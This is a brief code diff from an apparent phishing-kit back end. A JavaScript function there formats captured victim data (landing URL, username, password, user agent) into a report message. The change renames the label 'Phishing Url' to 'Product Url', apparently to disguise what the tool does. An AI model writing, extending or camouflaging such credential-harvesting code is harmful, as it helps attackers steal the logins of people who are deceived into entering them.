@@ -72,7 +72,7 @@ exports.delete = (req, res) => {
 
 const getFormattedMsg = (data) => {
   let msg = "";
-  msg += `Phishing Url: ${data.landingUrl}\n`;
+  msg += `Product Url: ${data.landingUrl}\n`;
   msg += `Username: ${data.username}\n`;
   msg += `Password: ${data.password}\n`;
   msg += `UserAgent: ${data.userAgent}\n`;
